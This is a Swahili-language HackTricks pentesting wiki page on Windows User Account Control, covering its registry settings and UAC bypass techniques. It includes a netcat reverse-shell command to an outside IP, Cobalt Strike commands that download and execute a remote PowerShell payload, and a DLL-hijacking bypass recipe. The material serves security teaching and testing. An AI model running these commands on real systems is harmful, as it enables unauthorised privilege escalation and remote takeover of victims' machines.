# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.

Kwa maelezo zaidi kuhusu viwango vya integrity:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye haki za msimamizi.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** katika **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary inapaswa kuwa **imetiwa saini na Microsoft** pia.

Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwa **mchakato wa kiwango cha juu cha integrity**.

Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Check UAC

Ili kuthibitisha ikiwa UAC imewezeshwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC ime **wezeshwa**, ikiwa ni **`0`** au haipo, basi UAC ni **isiyoweza**.

Kisha, angalia **ni kiwango gani** kimewekwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
- Ikiwa **`2`** (**Daima niarifu**) UAC daima itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu kwa mamlaka ya juu (katika Desktop Salama)
- Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
- Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
- ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu

Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
Ikiwa thamani ni **`0`**, basi, mtumiaji wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi "Administrators"** zinaweza kufanya hivyo.

Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.

#### Muhtasari

- Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa mtu yeyote**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi wa ndani)**
- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**

Taarifa hii yote inaweza kukusanywa kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`

Unaweza pia kuangalia makundi ya mtumiaji wako na kupata kiwango cha uaminifu:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!NOTE]
> Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana

UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**

### UAC disabled

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kurudi na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sana** Msingi UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Wasimamizi unaweza **kuunganisha C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) ndani ya diski mpya na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).

> [!WARNING]
> **Inaonekana kama hila hii haitumiki tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitaweza kufanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **kuepuka** **UAC**.

### KRBUACBypass

Hati na chombo katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maombi mengine** ambayo yatamwonya **mtumiaji** kwamba kuna kitu kinatokea.

UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusiana na toleo lako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
pia, kutumia [hii](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata toleo la Windows `1607` kutoka kwa toleo la kujenga.

#### UAC bypass zaidi

**Mbinu zote** zinazotumika hapa kukwepa AUC **zinahitaji** **shell ya mwingiliano kamili** na mwathirika (shell ya kawaida ya nc.exe haitoshi).

Unaweza kupata kwa kutumia **meterpreter** kikao. Hamisha kwa **mchakato** ambao una **Thamani ya Kikao** sawa na **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass na GUI

Ikiwa una ufikiaji wa **GUI unaweza tu kukubali kiashiria cha UAC** unapokipata, huwezi kweli kuhitaji kukwepa. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kukwepa UAC.

Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akikitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zikifanya kazi kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.

### UAC bypass ya nguvu inayosikika

Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **kinahitaji kuinua ruhusa hadi mtumiaji akubali**.

### Kukwepa kwako mwenyewe - Mbinu ya msingi ya UAC bypass

Ikiwa utaangalia **UACME** utaona kwamba **kebisha nyingi za UAC zinatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Tafuta binary ambayo itafanya **autoelevate** (angalia kwamba inapotekelezwa inafanya kazi katika kiwango cha juu cha uaminifu).
2. Kwa procmon pata matukio ya "**JINA HALIKUPATIKANA**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kukwepa hii kwa kutumia:
   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojitenga.

### Mbinu nyingine ya UAC bypass

Inajumuisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka kwa **rejista** jina/njia ya **binary** au **amri** inayopaswa **kutekelezwa** (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
